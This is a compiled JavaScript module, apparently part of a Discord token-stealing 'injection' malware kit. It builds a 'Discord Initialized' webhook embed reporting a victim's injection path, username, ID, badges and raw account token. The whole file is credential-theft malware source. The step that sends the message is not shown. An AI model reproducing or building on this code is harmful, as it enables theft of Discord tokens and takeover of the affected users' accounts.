"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getDiscordInitializedEmbed = void 0;
const fakeProfile_1 = require("../fakeProfile");
const baseEmbed_1 = require("./baseEmbed");
const utils_1 = require("../utils");
async function getDiscordInitializedEmbed(config, account = new fakeProfile_1.FakeAccount()) {
    const { embeds, webhookMessage } = (0, baseEmbed_1.getBaseEmbeds)(config);
    const embed = embeds[0];
    embed.setTitle("Discord Initialized");
    embed.setThumbnail(await account.discord.getAvatar());
    embed.setFields([{
            name: "Info",
            value: (0, utils_1.warpTripleQuote)(account.injectionPath),
            inline: false
        }, {
            name: "Username",
            value: (0, utils_1.warpInQuote)(account.discord.tag),
            inline: true
        }, {
            name: "ID",
            value: (0, utils_1.warpInQuote)(account.discord.id),
            inline: true
        }, {
            name: "Badges",
            value: account.discord.badges.join(" "),
            inline: false
        }, {
            name: "Token",
            value: (0, utils_1.warpTripleQuote)(account.discord.token),
            inline: false
        }]);
    return webhookMessage();
}
exports.getDiscordInitializedEmbed = getDiscordInitializedEmbed;
